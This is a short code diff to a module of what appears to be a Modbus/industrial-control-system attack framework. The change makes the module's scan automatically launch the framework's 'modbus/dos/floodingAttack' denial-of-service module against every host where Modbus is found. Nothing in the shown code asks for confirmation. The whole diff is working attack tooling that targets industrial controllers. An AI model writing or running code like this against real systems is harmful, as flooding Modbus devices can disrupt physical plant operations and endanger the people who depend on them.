@@ -3,7 +3,7 @@ import threading
 
 from System.Core.Global import *
 from System.Core.Colors import *
-from System.Core import Modbus
+from System.Core import Modbus, Loader
 from System.Lib import ipcalc
 
 class Module:
@@ -20,7 +20,7 @@ class Module:
 		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
 		'Threads'	:[1		,False	,'The number of concurrent threads'],
 		'Output'	:[True		,False	,'The stdout save in output directory']
-	}	
+	}
 	output = ''
 
 	def exploit(self):
@@ -57,7 +57,13 @@ class Module:
 		result = Modbus.connectToTarget(ip,self.options['RPORT'][0])
 		if (result != None):
 			self.printLine('[+] Modbus is running on : ' + ip,bcolors.OKGREEN)
-			
+			plugins = Loader.plugins(modulesPath)
+			plugins.crawler()
+			plugins.load()
+			pluginNumber = len(plugins.pluginTree)
+			modules = plugins.modules
+			modules["modbus/dos/floodingAttack"].options["RHOSTS"][0] = ip
+			modules["modbus/dos/floodingAttack"].exploit()
 		else:
 			self.printLine('[-] Modbus is not running on : ' + ip,bcolors.WARNING)
-		
+
